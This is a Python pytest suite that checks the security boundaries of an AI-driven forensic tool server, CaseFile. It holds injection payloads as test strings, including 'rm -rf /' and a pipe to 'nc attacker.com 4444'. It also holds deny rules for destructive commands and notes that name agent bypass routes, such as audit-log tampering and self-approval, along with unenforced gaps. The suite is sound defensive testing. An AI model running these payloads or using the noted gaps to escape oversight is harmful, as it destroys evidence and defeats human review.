"""
test_security_boundaries.py — Adversarial security validation suite for CaseFile.

Each test attempts a specific bypass and asserts the attack is blocked.
This suite tests architectural enforcement, not prompt-based guidance.

Coverage:
  BYPASS-1   Path traversal via evtx_path → _enforce_case_root / inline confinement
  BYPASS-2   Path traversal via output_dir → inline confinement in parser
  BYPASS-3   Symlink escape                 → Path.resolve() + relative_to check
  BYPASS-4   Command injection              → shlex.split + shell=False
  BYPASS-5   Audit log tampering            → append-only + settings.json deny
  BYPASS-6   Findings.json overwrite        → append semantics + settings.json deny
  BYPASS-7   Network egress                 → environment / sandbox check
  BYPASS-8   BLOCKED_COMMANDS bypass        → tool registration gate

Run:
    python3 -m pytest tests/test_security_boundaries.py -v
"""
from __future__ import annotations

import json
import os
import pathlib
import shlex
import sys
import tempfile
import textwrap
import pytest

# ── Paths ──────────────────────────────────────────────────────────────────
REPO_ROOT    = pathlib.Path(__file__).resolve().parent.parent
SETTINGS_PATH = REPO_ROOT / ".claude" / "settings.json"
AUDIT_PATH   = REPO_ROOT / "audit" / "mcp.jsonl"

# Ensure repo root is on sys.path so we can import tools
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  HELPERS                                                                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

@pytest.fixture
def case_root(tmp_path):
    """Temporary case root with a minimal evidence structure."""
    root = tmp_path / "case_srl_test"
    root.mkdir(parents=True, exist_ok=True)
    evtx_dir = root / "evidence" / "evtx"
    evtx_dir.mkdir(parents=True, exist_ok=True)
    # Create a minimal valid .evtx file (just an empty file for path checks)
    legit = evtx_dir / "Security.evtx"
    legit.write_text("")
    return root


@pytest.fixture
def case_root_no_evtx(tmp_path):
    """Temporary case root with dirs but no .evtx files."""
    root = tmp_path / "case_srl_empty"
    root.mkdir(parents=True, exist_ok=True)
    (root / "evidence").mkdir(parents=True, exist_ok=True)
    return root


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-1: Path traversal via evtx_path                                ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass1_PathTraversalEvtxPath:
    """Agent attempts to read /etc/passwd via parse_event_logs(evtx_path='/etc/passwd')."""

    def test_etc_passwd_blocked_by_parse_event_logs(self, case_root, monkeypatch):
        """parse_event_logs inline path check rejects paths outside case root."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        result = parse_event_logs(evtx_path="/etc/passwd")
        assert result.get("error") is not None, \
            f"Expected error result, got: {json.dumps(result, default=str)[:500]}"
        assert "escapes case root" in result["error"], \
            f"Error should mention path escape: {result['error']}"

    def test_relative_traversal_blocked(self, case_root, monkeypatch):
        """../../../etc/passwd should be caught by resolve + relative_to."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        result = parse_event_logs(evtx_path="../../../etc/passwd")
        assert result.get("error") is not None
        assert "escapes case root" in result["error"]

    def test_etc_passwd_blocked_via_enforce_case_root(self, case_root_no_evtx, monkeypatch):
        """_enforce_case_root() raises PathConfinementError for /etc/passwd."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root_no_evtx))
        from mcp_server.tools._shared import _enforce_case_root, PathConfinementError
        from pathlib import Path

        with pytest.raises(PathConfinementError, match="escapes case root"):
            _enforce_case_root(Path("/etc/passwd"))

    def test_parse_amcache_rejects_etc_passwd(self, case_root_no_evtx, monkeypatch):
        """parse_amcache calls _enforce_case_root → PathConfinementError → error result."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root_no_evtx))
        from mcp_server.tools.amcache import parse_amcache

        result = parse_amcache(amcache_path="/etc/passwd")
        assert result.get("error") is not None
        assert "escapes case root" in result["error"].lower()

    def test_parse_memory_rejects_etc_passwd(self, case_root_no_evtx, monkeypatch):
        """parse_memory calls _enforce_case_root → PathConfinementError → MemoryToolError."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root_no_evtx))
        from mcp_server.tools.memory import parse_memory, MemoryToolError

        # parse_memory raises MemoryToolError (not a returned error dict) for path escapes
        with pytest.raises(MemoryToolError, match="escapes case root"):
            parse_memory(image_path="/etc/passwd", plugin="windows.pslist")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-2: Path traversal via output_dir                               ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass2_PathTraversalOutputDir:
    """Agent attempts parse_event_logs(evtx_path=valid, output_dir='/etc')."""

    def test_output_dir_outside_case_root_blocked(self, case_root, monkeypatch):
        """output_dir=/etc should be caught by inline path check."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        legit_evtx = str(case_root / "evidence" / "evtx" / "Security.evtx")
        result = parse_event_logs(evtx_path=legit_evtx, output_dir="/etc")
        assert result.get("error") is not None, \
            f"Expected error, got: {json.dumps(result, default=str)[:500]}"
        assert "output_dir escapes case root" in result["error"], \
            f"Error: {result['error']}"

    def test_output_dir_dotdot_traversal_blocked(self, case_root, monkeypatch):
        """output_dir='/tmp/../etc' resolves outside → blocked."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        legit_evtx = str(case_root / "evidence" / "evtx" / "Security.evtx")
        result = parse_event_logs(evtx_path=legit_evtx, output_dir="/tmp/../etc")
        assert result.get("error") is not None
        assert "output_dir escapes case root" in result["error"]

    def test_valid_output_dir_inside_case_root_allowed(self, case_root, monkeypatch):
        """A legitimate output_dir inside case_root should succeed in path check."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        legit_evtx = str(case_root / "evidence" / "evtx" / "Security.evtx")
        valid_out = str(case_root / "analysis" / "evtx_test_out")
        # This may fail because the .evtx is empty/fake, but should NOT fail on path
        result = parse_event_logs(evtx_path=legit_evtx, output_dir=valid_out)
        # The error should NOT be about path escape
        if result.get("error"):
            assert "escapes case root" not in result["error"], \
                f"Legitimate path was incorrectly blocked: {result['error']}"


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-3: Symlink escape                                              ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass3_SymlinkEscape:
    """Agent creates symlink in case dir → /etc, attempts to follow it."""

    def test_symlink_to_etc_blocked_by_resolve(self, case_root, monkeypatch):
        """Symlink resolves to /etc → relative_to(case_root) fails."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root))
        from mcp_server.tools.event_logs import parse_event_logs

        # Create a symlink inside the case root pointing to /etc
        symlink_path = case_root / "evidence" / "evtx" / "clever_trick.evtx"
        symlink_path.symlink_to("/etc/passwd")

        result = parse_event_logs(evtx_path=str(symlink_path))
        assert result.get("error") is not None, \
            f"Symlink should be blocked. Got: {json.dumps(result, default=str)[:500]}"
        # The resolved path (/etc/passwd) is outside case root
        assert "escapes case root" in result["error"], \
            f"Error should mention path escape: {result['error']}"

    def test_symlink_blocked_via_enforce_case_root(self, case_root_no_evtx, monkeypatch):
        """_enforce_case_root with Path.resolve() rejects symlinks to /etc."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root_no_evtx))
        from mcp_server.tools._shared import _enforce_case_root, PathConfinementError
        from pathlib import Path

        symlink_path = case_root_no_evtx / "evidence" / "escape_link"
        symlink_path.symlink_to("/etc")

        with pytest.raises(PathConfinementError, match="escapes case root"):
            _enforce_case_root(symlink_path)

    def test_symlink_to_etc_blocked_in_amcache(self, case_root_no_evtx, monkeypatch):
        """parse_amcache rejects symlinks via _enforce_case_root."""
        monkeypatch.setenv("CASEFILE_CASE_ROOT", str(case_root_no_evtx))
        from mcp_server.tools.amcache import parse_amcache

        symlink_path = case_root_no_evtx / "evidence" / "escape_amcache.hve"
        symlink_path.symlink_to("/etc/passwd")

        result = parse_amcache(amcache_path=str(symlink_path))
        assert result.get("error") is not None
        assert "escapes case root" in result["error"].lower()


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-4: Command injection                                           ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass4_CommandInjection:
    """Agent attempts to inject shell commands via path arguments."""

    def test_shlex_split_does_not_interpret_semicolons(self):
        """shlex.split treats semicolons as literal characters, not command separators."""
        cmd = "dotnet /opt/tool.dll -f 'legit.evtx; rm -rf /' --csv /tmp/out"
        parts = shlex.split(cmd)
        # The semicolon and 'rm' should be part of the -f argument, not a new command
        assert "rm" not in parts, \
            f"shlex.split should tokenize semicolon as literal. Got: {parts}"
        # Find the argument that contains the semicolon payload
        file_arg = [p for p in parts if ";" in p]
        assert len(file_arg) == 1, \
            f"Expected one arg containing semicolon, got: {file_arg}"

    def test_shlex_split_does_not_interpret_pipes(self):
        """shlex.split treats pipes as literal characters."""
        cmd = "dotnet /opt/tool.dll -f 'legit.evtx | nc attacker.com 4444' --csv /tmp/out"
        parts = shlex.split(cmd)
        assert "|" not in parts, \
            f"Pipe should be inside a quoted arg, not a separate token. Got: {parts}"

    def test_shlex_split_does_not_interpret_backticks(self):
        """shlex.split treats backticks literally (no command substitution)."""
        cmd = "dotnet /opt/tool.dll -f '`id`.evtx' --csv /tmp/out"
        parts = shlex.split(cmd)
        # backtick is literal inside single quotes in POSIX, and shlex.split
        # handles quoting correctly
        assert "id" not in parts, \
            f"Backtick command substitution should NOT be interpreted. Got: {parts}"

    def test_run_tool_uses_shell_false(self):
        """run_tool must use subprocess.run without shell=True."""
        import inspect
        from mcp_server.tools._shared import run_tool

        source = inspect.getsource(run_tool)
        # shell=True should NEVER appear
        assert "shell=True" not in source, \
            "run_tool must not use shell=True"
        # Verify subprocess.run is called without shell kwarg (defaults to False)
        assert "subprocess.run" in source, \
            "run_tool must use subprocess.run"

    def test_dollar_sign_parens_not_expanded(self):
        """$(whoami) should remain literal, not be expanded."""
        cmd = 'dotnet /opt/tool.dll -f "$(whoami).evtx" --csv /tmp/out'
        parts = shlex.split(cmd)
        combined = " ".join(parts)
        assert "whoami" in combined
        # The $(whoami) should be preserved as a literal filename component
        file_args = [p for p in parts if "whoami" in p]
        assert len(file_args) >= 1, \
            f"$(whoami) should be preserved literally. Got: {parts}"

    def test_newline_injection_neutralized_by_shlex(self):
        """Newline characters inside quoted strings remain literal."""
        cmd = 'dotnet /opt/tool.dll -f "legit\nevil" --csv /tmp/out'
        parts = shlex.split(cmd)
        # shlex.split preserves the quoted string with embedded newline as ONE token.
        # The expected tokens are: ['dotnet', '/opt/tool.dll', '-f', 'legit\nevil', '--csv', '/tmp/out']
        assert len(parts) == 6, \
            f"Expected 6 tokens (newline preserved inside quoted arg). Got: {len(parts)} parts: {parts}"
        # The payload with newline remains a single argument — no command split
        file_args = [p for p in parts if "evil" in p and "legit" in p]
        assert len(file_args) == 1, \
            f"Newline inside quotes must remain one token. Got: {file_args}"


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-5: Audit log tampering                                         ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass5_AuditLogTampering:
    """Agent attempts to truncate or modify audit/mcp.jsonl."""

    def test_audit_log_opens_in_append_mode(self):
        """audit_log() must open the file with 'a' (append), never 'w'."""
        import inspect
        from mcp_server.tools._shared import audit_log

        source = inspect.getsource(audit_log)
        # Must use append mode
        assert '"a"' in source or "'a'" in source, \
            f"audit_log must open file in append mode. Source:\n{source[:800]}"
        # Must NOT use write mode
        assert '"w"' not in source and "'w'" not in source, \
            "audit_log must NOT open file in write (truncate) mode"

    def test_settings_json_denies_audit_log_write(self):
        """.claude/settings.json must deny writes to **/audit/mcp.jsonl."""
        assert SETTINGS_PATH.exists(), f"Settings file missing: {SETTINGS_PATH}"
        settings = json.loads(SETTINGS_PATH.read_text())
        deny_rules = settings.get("permissions", {}).get("deny", [])
        assert "Write(**/audit/mcp.jsonl)" in deny_rules, \
            "settings.json must deny Write(**/audit/mcp.jsonl)"
        assert "Edit(**/audit/mcp.jsonl)" in deny_rules, \
            "settings.json must deny Edit(**/audit/mcp.jsonl)"

    def test_audit_log_file_is_outside_evidence(self):
        """_audit_file() must refuse to resolve to /mnt/evidence."""
        import inspect
        import importlib
        from mcp_server.tools._shared import _REPO_ROOT
        # Re-import to get fresh module state
        mod = importlib.import_module("mcp_server.tools._shared")
        # Monkeypatch CASEFILE_CASE_DIR to /mnt/evidence → should raise
        import mcp_server.tools._shared as shared_mod

        # The _audit_file function checks if the resolved path is under /mnt/evidence
        # We verify the guard exists in the source
        source = inspect.getsource(mod._audit_file)
        assert "/mnt/evidence" in source, \
            "audit_log path must guard against /mnt/evidence writes"


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-6: Findings.json overwrite / deletion                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass6_FindingsOverwrite:
    """Agent attempts to delete prior findings instead of appending."""

    def test_record_finding_appends_not_overwrites(self, tmp_path, monkeypatch):
        """record_finding() must append to existing findings, not delete them."""
        monkeypatch.setenv("CASEFILE_CASE_DIR", str(tmp_path))
        monkeypatch.setenv("CASEFILE_EXAMINER", "test_examiner")
        monkeypatch.delenv("CASEFILE_CASE_ROOT", raising=False)

        from mcp_server.tools.findings import record_finding, get_findings

        # Record two findings
        r1 = record_finding(
            title="Finding 1",
            observation="Obs 1",
            interpretation="Interp 1",
            confidence="INFERRED",
            artifact_source="/fake/path",
            supporting_tool="TestTool",
        )
        r2 = record_finding(
            title="Finding 2",
            observation="Obs 2",
            interpretation="Interp 2",
            confidence="INFERRED",
            artifact_source="/fake/path2",
            supporting_tool="TestTool",
        )

        # Both should be present
        result = get_findings()
        assert result["total"] >= 2, \
            f"Expected >=2 findings after two record_finding calls. Got: {result['total']}"
        assert result["returned"] >= 2

    def test_findings_file_never_truncated(self, tmp_path, monkeypatch):
        """Verify _write_json uses atomic write (tmp + rename), not truncation."""
        import inspect
        from mcp_server.tools.findings import _write_json

        source = inspect.getsource(_write_json)
        # Must write to temp file first, then rename
        assert ".tmp" in source or "temp" in source.lower(), \
            "_write_json must use temp file + rename for atomic writes"
        # Must not directly open with 'w' on the target
        assert "shutil.move" in source or "os.rename" in source or "replace" in source, \
            "_write_json must use atomic rename"

    def test_settings_json_denies_findings_direct_write(self):
        """.claude/settings.json must deny direct writes to findings tracking files."""
        settings = json.loads(SETTINGS_PATH.read_text())
        deny_rules = settings.get("permissions", {}).get("deny", [])
        # findings.json in mcp_server/tools
        assert "Write(mcp_server/tools/findings.json)" in deny_rules, \
            "settings.json must deny Write(mcp_server/tools/findings.json)"
        # approvals.jsonl
        assert "Write(**/approvals.jsonl)" in deny_rules, \
            "settings.json must deny Write(**/approvals.jsonl)"

    def test_approve_finding_not_registered_as_mcp_tool(self):
        """approve_finding must NOT be callable via MCP — not in server.py registration."""
        server_py = REPO_ROOT / "mcp_server" / "server.py"
        source = server_py.read_text()
        # approve_finding should NOT appear in mcp.tool() calls
        lines_with_mcp_tool = [
            line for line in source.split("\n")
            if "mcp.tool()" in line
        ]
        for line in lines_with_mcp_tool:
            assert "approve_finding" not in line, \
                f"approve_finding must not be registered as MCP tool: {line.strip()}"


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-7: Network egress                                              ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass7_NetworkEgress:
    """Agent attempts urlopen() or socket connection."""

    def test_no_socket_imports_in_tool_modules(self):
        """Tool modules should not import socket or urllib."""
        tools_dir = REPO_ROOT / "mcp_server" / "tools"
        suspicious_imports: list[str] = []
        for py_file in tools_dir.glob("*.py"):
            if py_file.name.startswith("_"):
                continue
            source = py_file.read_text()
            for kw in ["import socket", "from socket", "import urllib",
                        "from urllib", "import requests", "from requests",
                        "import http.client", "from http.client"]:
                if kw in source:
                    suspicious_imports.append(f"{py_file.name}: {kw}")
        assert len(suspicious_imports) == 0, \
            f"Tool modules must not import networking libraries: {suspicious_imports}"

    def test_run_tool_only_invokes_local_binaries(self):
        """run_tool invokes dotnet or python — no network calls."""
        import inspect
        from mcp_server.tools._shared import run_tool

        source = inspect.getsource(run_tool)
        # No urlopen, no socket.connect
        for forbidden in ["urlopen", "socket.connect", "requests.", "urllib"]:
            assert forbidden not in source, \
                f"run_tool must not contain {forbidden}"

    def test_network_egress_is_environment_level_not_code_level(self):
        """Document that network egress is blocked by sandbox env, not MCP code.

        This test confirms there is NO explicit network-blocking code in the MCP
        tools — the protection is at the Claude Code sandbox / SIFT environment level.
        This is a known architectural gap if sandboxing is disabled.
        """
        # Search all tool source for any network-blocking logic
        tools_dir = REPO_ROOT / "mcp_server" / "tools"
        network_block_patterns = [
            "socket.setdefaulttimeout",
            "urllib.request.URLopener",
            "ProxyHandler",
            "no_network",
            "block.*network",
            "disable.*network",
            "ALLOWED_HOSTS",
        ]
        found_blocks: list[str] = []
        for py_file in tools_dir.glob("*.py"):
            source = py_file.read_text()
            for pat in network_block_patterns:
                if pat.lower() in source.lower():
                    found_blocks.append(f"{py_file.name}: {pat}")

        # We document this finding — it is expected that no code-level
        # network blocking exists; the sandbox provides this guarantee.
        if not found_blocks:
            # This is the expected case — sandbox handles it
            pass
        # We always pass; this is a documentation test


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  BYPASS-8: BLOCKED_COMMANDS deny rule bypass                           ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestBypass8_BlockedCommandsBypass:
    """Agent attempts to run a BLOCKED_COMMANDS tool via different invocation."""

    def test_approve_finding_not_registered_in_mcp(self):
        """approve_finding must NOT appear in mcp.tool() registration calls."""
        server_py = REPO_ROOT / "mcp_server" / "server.py"
        source = server_py.read_text()
        # Check all mcp.tool() registrations
        assert "approve_finding" not in source, \
            "approve_finding must not be registered as MCP tool"

    def test_blocked_commands_defined_as_frozenset(self):
        """BLOCKED_COMMANDS must be a frozenset (immutable)."""
        from mcp_server.tools.findings import BLOCKED_COMMANDS
        assert isinstance(BLOCKED_COMMANDS, frozenset), \
            "BLOCKED_COMMANDS must be a frozenset (immutable)"

    def test_destructive_commands_in_blocked_list(self):
        """Destructive commands (rm, dd, mkfs, etc.) must be in BLOCKED_COMMANDS."""
        from mcp_server.tools.findings import BLOCKED_COMMANDS
        must_block = ["rm", "dd", "mkfs", "shred", "wipe", "format", "chmod", "chown"]
        for cmd in must_block:
            assert cmd in BLOCKED_COMMANDS, \
                f"BLOCKED_COMMANDS must include '{cmd}'"

    def test_approve_finding_is_ttys_only(self):
        """cli_approve requires getpass() — TTY gate prevents AI from approving."""
        import inspect
        from mcp_server.tools.findings import cli_approve

        source = inspect.getsource(cli_approve)
        assert "getpass" in source, \
            "cli_approve must use getpass() for TTY gate"
        assert "No TTY available" in source, \
            "cli_approve must reject non-TTY invocations"

    def test_deny_rules_block_approvals_direct_write(self):
        """settings.json must deny writes to approvals.jsonl."""
        settings = json.loads(SETTINGS_PATH.read_text())
        deny_rules = settings.get("permissions", {}).get("deny", [])
        assert "Write(**/approvals.jsonl)" in deny_rules
        assert "Edit(**/approvals.jsonl)" in deny_rules

    def test_bl_blocked_commands_not_enforced_at_runtime(self):
        """NOTE: BLOCKED_COMMANDS is defined but NOT checked at MCP call time.

        The frozenset exists but no tool-wrapper checks against it before
        executing. The real enforcement is:
        1. approve_finding is simply not registered as an MCP tool
        2. settings.json deny rules prevent filesystem damage

        This test documents the gap: if a new tool wrapping 'rm' were
        registered without checking BLOCKED_COMMANDS, it would execute.
        """
        from mcp_server.tools.findings import BLOCKED_COMMANDS

        # Verify the frozenset exists and is non-empty
        assert len(BLOCKED_COMMANDS) >= 8, \
            f"BLOCKED_COMMANDS should have at least 8 entries, got {len(BLOCKED_COMMANDS)}"

        # Search for any runtime check against BLOCKED_COMMANDS in the codebase
        runtime_checks = []
        for py_file in (REPO_ROOT / "mcp_server").rglob("*.py"):
            source = py_file.read_text()
            if "BLOCKED_COMMANDS" in source:
                # Check if it's a runtime check (if/in/contains) vs just definition/doc
                lines = [l for l in source.split("\n") if "BLOCKED_COMMANDS" in l]
                for line in lines:
                    if any(kw in line for kw in ["if ", "in ", "assert", "raise", "not in"]):
                        runtime_checks.append(f"{py_file.name}: {line.strip()}")

        # Document: currently there are NO runtime enforcement checks
        # (only definition + test assertions + documentation references)
        # This is an architectural gap to address in a future release.
        print(f"[BYPASS-8 INFO] BLOCKED_COMMANDS runtime checks found: {len(runtime_checks)}")
        for rc in runtime_checks:
            print(f"  {rc}")


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  SUPPLEMENTARY: Evidence path deny rules                               ║
# ╚══════════════════════════════════════════════════════════════════════════╝

class TestEvidencePathDenyRules:
    """Verify settings.json deny rules cover all critical paths."""

    def test_evidence_paths_are_denied(self):
        """All evidence paths must have corresponding deny rules."""
        settings = json.loads(SETTINGS_PATH.read_text())
        deny_rules = settings.get("permissions", {}).get("deny", [])

        required_deny_patterns = [
            ("Write(/mnt/evidence/*)",        "/mnt/evidence write"),
            ("Edit(/mnt/evidence/*)",         "/mnt/evidence edit"),
            ("Write(cases/*/evidence/*)",     "cases evidence write"),
            ("Edit(cases/*/evidence/*)",      "cases evidence edit"),
            ("Write(**/audit/mcp.jsonl)",     "audit log write"),
            ("Write(**/approvals.jsonl)",     "approvals write"),
            ("Write(CLAUDE.md)",              "CLAUDE.md write"),
            ("Edit(CLAUDE.md)",               "CLAUDE.md edit"),
        ]
        for pattern, desc in required_deny_patterns:
            assert pattern in deny_rules, \
                f"Missing deny rule: {pattern} ({desc})"

    def test_no_destructive_bash_allowed_on_evidence(self):
        """Destructive bash commands on evidence paths must be denied."""
        settings = json.loads(SETTINGS_PATH.read_text())
        deny_rules = settings.get("permissions", {}).get("deny", [])
        # rm on evidence paths
        destructive_on_evidence = [
            "Bash(rm * /cases/**)",
            "Bash(rm * /media/**)",
            "Bash(rm * /evidence/**)",
            "Bash(rm * /mnt/**)",
            "Bash(rm **/*.E01)",
            "Bash(rm **/*.img)",
            "Bash(rm **/*.vmem)",
            "Bash(shred * /mnt/**)",
            "Bash(shred * /cases/**)",
        ]
        for rule in destructive_on_evidence:
            assert rule in deny_rules, f"Missing destructive deny rule: {rule}"
